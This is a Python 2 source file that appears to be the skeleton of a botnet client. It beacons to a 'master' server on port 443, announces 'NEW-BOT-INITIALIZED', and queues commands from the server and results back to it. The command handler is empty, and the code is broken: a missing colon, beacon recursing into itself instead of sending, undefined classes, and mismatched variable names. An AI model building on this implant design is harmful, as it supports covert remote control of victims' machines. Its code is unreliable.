import socket
import time
import Queue
import threading
import jsonpickle
import simplejson 	# jsonpickle depends on this below python 2.6

## Information

clientID = ""
localhost = "127.0.0.1"
master = "127.0.0.1"

## Fields

sleepDuration = 5	# Interval between beacon attempts
debugPrint = True	# Print error messages on the local console
pythonErrors = True	# Send error messages to server


## Management Queues

todoQ = Queue.Queue()	# Command objects that must be completed yet
sendQ = Queue.Queue()	# Completed Command objects to be sent back to the server
errQ = Queue.Queue()	# Holds python error messages


## Threads

class Handler (threading.Thread):
	
	def __init__(self, pyObj):
		
		self.obj = pyObj
		threading.Thread.__init__(self)

	def run(self):		
			
		pass					


## Helper Functions

def makeJSON (pyObj):
	
	try:
		jsonObj = jsonpickle.encode(pyObj)
		if debugPrint:
			print(str(jsonObj))
		return jsonObj

	except Exception as e:
		if pythonErrors:
			errQ.put(e)
		if debugPrint:
			print("Error converting to JSON: "+str(e))

def getJSON (jsonObj):

	try:
		pyObj = jsonpickle.decode(jsonObj)
		if debugPrint:
			print(str(pyObj))
		return pyObj

	except Exception as e:
		if pythonErrors:
			errQ.put(e)
		if debugPrint:
			print("Error converting from JSON: "+str(e))


def send (dst_addr, dst_port, data):
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(( dst_addr, dst_port ))
		s.sendall(data)
		response = s.recv()
		if debugPrint:
			print("Data Sent: "+data)
			print("Response:  "+response)
		return response

	except Exception as e:
		if pythonErrors:
			errQ.put(e)
		if debugPrint:
			print("Error when attempting to Beacon: "+str(e))
			

def beacon (dst_addr, dst_port, init=False)
	
	cmds = []
	info = []
	if init:
		cmds = [ Command(time.time(), time.time(), "NEW-BOT-INITIALIZED", "") ]
		info = [0]
	while not sendQ.empty():
		cmds.append(sendQ.get())
 	sendObj = makeJSON( Reply_Token( client_id, localhost, cmds, info ) )
	response = beacon (master, 443, sendObj)
	handler = Handler(response)
	handler.start()
	

def main ():

	beacon(master, 443, True)
	while True:
		time.sleep(sleepDuration)
		beacon(master, 443)	## TODO Implement more beacon methods (DNS, etc.)
				
	

